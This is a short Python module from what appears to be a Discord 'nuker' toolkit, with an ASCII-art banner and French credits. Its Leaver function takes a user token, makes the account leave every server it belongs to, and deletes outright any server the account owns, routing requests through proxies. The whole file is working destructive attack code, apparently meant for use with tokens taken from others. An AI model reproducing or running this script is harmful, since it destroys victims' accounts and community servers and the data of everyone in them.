###############################################################
# 
# 
#                              
# ⢿⢻⡛⡏⢏⡟⢻⡹⣛⠟⠛⡉⠛⡙⠛⢿⣏⠻⣟⢫⣟⣿⣿⡿⣝⢯⢯⣽⡻⢼
# ⢇⢧⠳⡙⠦⣘⠡⡑⢄⠊⠡⢀⠁⠄⡈⠄⢋⠗⡬⢳⣮⡽⣒⡟⣾⡹⣎⣣⠵⣸
# ⢌⢢⡑⠥⢃⡄⢣⠐⠠⠈⠄⠠⢀⠂⠠⠈⡄⢊⠑⡈⢿⠓⡰⣿⣖⡹⢳⢧⣛⢸
# ⢨⠐⡌⠘⣤⠘⢠⡌⢠⠁⡌⠐⠀⡄⠁⡎⠐⡌⠐⢠⠈⣤⠁⢻⣿⡖⠉⡎⣽⢸
# ⢀⠣⢌⣱⣤⣳⣦⣶⣌⣒⠤⣃⠔⡠⢃⠄⢣⠐⡡⠂⢌⠠⡘⢦⣿⣏⠱⠲⣍⢺
# ⣌⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢆⠑⡈⢐⠂⠱⢠⠑⣈⠶⣙⢶⣳⣮⣯⣷⣼⣸
# ⢻⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣇⠀⠂⠐⠠⠈⡐⢀⠣⢜⡸⡹⣾⣿⣿⣿⣿⣿⢿
# ⠉⢿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣷⡈⠐⠀⠀⡀⠀⠄⠂⠂⠡⡑⣿⣿⣿⣿⣿⣿⣿
# ⣍⠦⣌⢛⡛⠿⠻⠟⠛⠋⠁⠄⠐⠀⠐⣀⠐⣨⣴⣞⣦⣧⡔⡘⢿⣿⣿⣿⣿⣽
# ⢌⠲⢤⠃⢈⣤⡞⠻⣧⠀⠠⠀⠀⠂⢀⠸⠿⢿⣿⢾⣾⣿⣿⠗⠠⢉⠙⠋⣻⢻
# ⣌⠓⡎⡔⣻⡶⢫⣵⡟⠀⠀⢀⠡⠀⠆⠠⠐⣀⠚⡿⡟⢋⠠⢈⠐⡄⡈⡔⡹⢻
# ⠀⡜⢣⡸⠟⠀⠀⠟⠃⠘⠠⠀⡄⢣⠘⡤⢛⡄⣻⣸⡧⢄⠣⠄⡤⢀⠣⣘⠣⢼
# ⡐⠌⠡⠐⡀⠌⠐⠠⢈⢂⠡⢣⠜⣧⣷⣔⣣⣞⣵⣿⣿⣮⣣⠝⣤⢋⡔⢢⡱⢸
# ⠰⣈⠑⢂⠠⠐⡈⡐⠌⢢⠙⣆⢫⠴⣩⢛⡝⣫⢛⠦⣭⢙⠿⣿⠶⣍⡞⣥⢓⢸
# ⠱⠄⠎⢆⠳⡐⢄⠢⢉⠦⣙⠬⡒⡍⢦⡉⢖⡡⣋⡞⣤⢋⡞⣵⣻⣞⡼⢦⣏⣸
# 
#             
# 
###############################################################
# Crée par inteligence x
# Github: https://github.com/ix666
# Discord: https://discord.gg/jugement
# © 2022 ix
###############################################################

import requests
import ix

from colorama import Fore

from util.plugins.common import print_slow, getheaders, proxy

def Leaver(token, guilds):
    for guild in guilds:
        response = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
        if response.status_code == 204 or response.status_code == 200:
            print(f"{Fore.YELLOW}J'ai quitter le serveur: {Fore.WHITE}"+guild['name']+Fore.RESET)
        elif response.status_code == 400:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            print(f'{Fore.RED}Serveur supprimée: {Fore.WHITE}'+guild['name']+Fore.RESET)
        else:
            print(f"L'erreur suivante a été rencontrée et est ignorée: {response.status_code}")
            pass